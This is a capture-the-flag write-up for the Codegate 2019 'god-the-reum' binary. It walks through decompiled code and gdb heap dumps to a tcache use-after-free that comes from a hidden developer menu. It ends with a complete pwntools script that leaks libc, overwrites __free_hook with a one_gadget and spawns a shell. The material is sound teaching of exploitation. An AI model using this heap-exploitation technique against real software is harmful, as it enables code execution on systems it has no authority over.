# Index

- [Summary](#Summary)
- [Analysis](#Analysis)
- [Exploit](#Exploit)
- [Payload](#Payload)
- [Comment](#Comment)

# Summary

- **tcache (libc-2.27.so)**
- **use_after_free**
- **overwrite __free_hook**



# Analysis

```shell
ch4rli3kop@ubuntu:~/ctf/codegate2019/god-the-reum$ checksec god-the-reum
[*] '/home/ch4rli3kop/ctf/codegate2019/god-the-reum/god-the-reum'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

There are Full Relro and PIE in this binary file.



```shell
====== Ethereum wallet service ========
1. Create new wallet
2. Deposit eth
3. Withdraw eth
4. Show all wallets
5. exit
select your choice : 1
how much initial eth? : 50

Creating new wallet succcess !

addr : 0x949525bd8880a6782c099abbd24c987c76827790, ballance 50
...
```

This binary works as above. Create new wallet, Deposit, Withdraw, ... etc.



## 

The main function is :

```c
struct wallet{
    char* address;
    int*  ballence;
};

__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  struct wallet *wallet_ptr; // rdi
  struct wallet wallet[4]; // [rsp+20h] [rbp-60h]
  unsigned __int64 v6; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  wallet_ptr = (struct wallet *)stdin;
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    menu();
    while ( getchar() != 10 )
      ;
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        wallet_ptr = &wallet[numOfWallet];
        create_wallet(wallet_ptr);
        break;
      case 2u:
        wallet_ptr = &wallet[(signed int)wallet_num()];
        deposit(wallet_ptr);
        break;
      case 3u:
        wallet_ptr = &wallet[(signed int)wallet_num()];
        withdraw(wallet_ptr);
        break;
      case 4u:
        wallet_ptr = wallet;
        show(wallet);
        break;
      case 5u:
        puts("bye da.");
        return 0LL;
      case 6u:
        wallet_ptr = &wallet[(signed int)wallet_num()];
        dev(wallet_ptr, 0LL);
        break;
      default:
        default((__int64)wallet_ptr, 0LL);
        break;
    }
  }
}
```

The each functions used `struct wallet` that allocated in main stack frame. 

And the contents in `wallet` is like this.

```c
struct wallet{
    char* address;    // --> "0x453131a53a1231d51..." random string
    int*  ballence;   // --> 0x60 eth inputed user
}
```



To learn the details of `wallet` usage, we would concentrate below function.

```c
unsigned __int64 __fastcall create_wallet(struct wallet *wallet_addr)
{
  char *string; // rax
  unsigned int seed; // eax
  char v4; // [rsp+13h] [rbp-1Dh]
  char v5; // [rsp+13h] [rbp-1Dh]
  signed int i; // [rsp+14h] [rbp-1Ch]
  size_t size; // [rsp+18h] [rbp-18h]
  void *alloc_space; // [rsp+20h] [rbp-10h]
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  alloc_space = malloc(0x82uLL);
  if ( !alloc_space || numOfWallet > 4 )
  {
    puts("wallet creation failed");
    exit(0);
  }
  memset(alloc_space, 0, 0x82uLL);
  string = (char *)alloc_space + strlen((const char *)alloc_space);
  *(_WORD *)string = 'x0';
  string[2] = 0;
  seed = time(0LL);
  srand(seed);
  for ( i = 0; i <= 0x27; ++i )
  {
    v4 = rand() % 15;
    if ( v4 > 9 )
      v5 = rand() % 6 + 'a';
    else
      v5 = v4 + '0';
    *((_BYTE *)alloc_space + i + 2) = v5;
  }
  wallet_addr->address = (__int64)alloc_space;
  printf("how much initial eth? : ", 0LL);
  __isoc99_scanf((__int64)"%llu", (__int64)&size);
  wallet_addr->ballence = (__int64)malloc(size);
  if ( wallet_addr->ballence )
    *(_QWORD *)wallet_addr->ballence = size;
  ++numOfWallet;
  clear();
  puts("Creating new wallet succcess !\n");
  print(wallet_addr->address, (_QWORD *)wallet_addr->ballence);
  putchar(10);
  return __readfsqword(0x28u) ^ v9;
}
```

The wallets can be made up to 5. And `numOfWallet` is used for it.



The Withdraw fuction can free wallet.ballence used size that user inputed. And, wallet.ballence can be freed only if wallet.ballence was 0. 

```c
unsigned __int64 __fastcall withdraw(struct wallet *wallet_ptr)
{
  __int64 value; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("how much you wanna withdraw? : ");
  __isoc99_scanf((__int64)"%llu", (__int64)&value);
  *(_QWORD *)wallet_ptr->ballence -= value;
  if ( !*(_QWORD *)wallet_ptr->ballence )
    free((void *)wallet_ptr->ballence);
  puts("withdraw ok !\n");
  return __readfsqword(0x28u) ^ v3;
}
```





There is a secret in this binary. The secret is that the hidden function exists, and the hidden function can cause **use-after-free bug**. 

The hidden functions is :

```c
__int64 __fastcall dev(struct wallet *wallet_ptr, __int64 _0)
{
  clear();
  puts("this menu is only for developer");
  puts("if you are not developer, please get out");
  sleep(1u);
  printf("new eth : ", _0);
  return __isoc99_scanf((__int64)"%10s", wallet_ptr->ballence);
}
```



# Exploit

First at all, we can know the libc address in the heap remains when the chunk with unsorted bin size was freed. If the chunk size included header is more than 0x420, when that chunk is freed, the `<main_arena>+96` (indicate top chunk address) is saved in that chunk's fd and bk. 

FYI, `main_arena` exists after `<__malloc_hook>+0x10`

```shell
gdb-peda$ heap freed
TCACHE: 0x5637aebac010
FASTBINS:
UNSORTBINS : 
bins 0 : 
0x5637aebac2e0 SIZE=0x420 DATA[0x5637aebac2f0] |.|r.H....|r.H...................| PREV_INUSE INUSED

gdb-peda$ x/10gx 0x5637aebac2e0
0x5637aebac2e0:	0x0000000000000000	0x0000000000000421
0x5637aebac2f0:	0x00007f48c7727ca0	0x00007f48c7727ca0
0x5637aebac300:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/gx 0x00007f48c7727ca0
0x7f48c7727ca0 <main_arena+96>:	0x00005637aebac800

[+] For Your Information..
0x7f48c7727c20 <__memalign_hook>:	0x00007f48c73d3410	0x00007f48c73d4790
0x7f48c7727c30 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7f48c7727c40 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7f48c7727c50 <main_arena+16>:	0x0000000000000000	0x0000000000000000
```



Then, we can overwrite the freed chunk's fd using the function 6 (**use-after-free**), and also overwrite the chunk's content using the function 6. So after we manipulate chunk's fd, we can allocate the chunk in manipulated location, and overwrite some value on there. When overwrite the freed chunk's fd, the context of tcache chains are like below.

```shell
gdb-peda$ heap freed
TCACHE: 0x5628d77f8010
counts: 1
0x5628d77f8790 SIZE=0x70 DATA[0x5628d77f87a0] |....n...........................| INUSED PREV_INUSE
overlap at 0x7f6efaaee8d8 -- size=0x0
'NoneType' object is not subscriptable
FASTBINS:
UNSORTBINS : 
bins 0 : 
0x5628d77f82e0 SIZE=0x420 DATA[0x5628d77f82f0] |....n.......n...................| PREV_INUSE INUSED

gdb-peda$ x/gx 0x5628d77f87a0
0x5628d77f87a0:	0x00007f6efaaee8e8

gdb-peda$ x/gx 0x00007f6efaaee8e8
0x7f6efaaee8e8 <__free_hook>:	0x0000000000000000

=========== chain like =============
gdb-peda$ x/10gx 0x5628d77f8790
0x5628d77f8790:	0x0000000000000000	0x0000000000000071
0x5628d77f87a0:	0x00007f6efaaee8e8	0x0000000000000000
0x5628d77f87b0:	0x0000000000000000	0x0000000000000000

gdb-peda$ x/10gx 0x00007f6efaaee8e8 - 0x10
0x7f6efaaee8d8 <_IO_stdfile_0_lock+8>:	0x0000000000000000	0x0000000000000000
0x7f6efaaee8e8 <__free_hook>:	0x0000000000000000	0x0000000000000000
0x7f6efaaee8f8 <next_to_use.11802>:	0x0000000000000000	0x0000000000000000
```



# Payload

```python
#!/usr/bin/python
from pwn import *

def Create(eth):
	r.sendlineafter('select your choice : ', '1')
	r.sendlineafter('how much initial eth? : ',str(eth))

def Withdraw(num, eth):
	r.sendlineafter('select your choice : ', '3')
	r.sendlineafter('input wallet no : ', str(num))
	r.sendlineafter('how much you wanna withdraw? : ', str(eth))

def Show(num):
	r.sendlineafter('select your choice : ', '4')
	r.recvuntil(str(num)+') addr : ')
	leak = int(r.recvline().split(' ')[2],10)
	return leak

def Develop(num, eth):
	r.sendlineafter('select your choice : ', '6')
	r.sendlineafter('input wallet no : ', str(num))
	sleep(1)
	r.sendlineafter('new eth : ', eth)

context.log_level = 'debug'
r = process('./god-the-reum', env={'LD_PRELOAD':'./libc-2.27.so'}) 
r = process('./god-the-reum')
libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
gdb.attach(r)

'''
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000

0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one = [0x4f2c5, 0x4f322, 0x10a38c]

Create(0x410) # 0x410 + header = 0x420
Create(0x60)
Withdraw(0, 0x410)
leak = Show(0)

# main_arena + 96
libc_base = leak - 96 - libc.symbols['__malloc_hook'] - 0x10
__free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + one[1]
success('leak(main_arena+88) = '+hex(leak))
log.info('libc_base = '+hex(libc_base))
log.info('__free_hook = '+hex(__free_hook))
log.info('one_gadget = '+hex(one_gadget))


Withdraw(1, 0x60)
Develop(1, p64(__free_hook))

Create(0x60)
Create(0x60)
Develop(3, p64(one_gadget))

Withdraw(2, 0x60)

r.interactive()
```



# Comment

- I was studying eng these days, i just try writing post in eng.
- It is pretty awesome lol :D
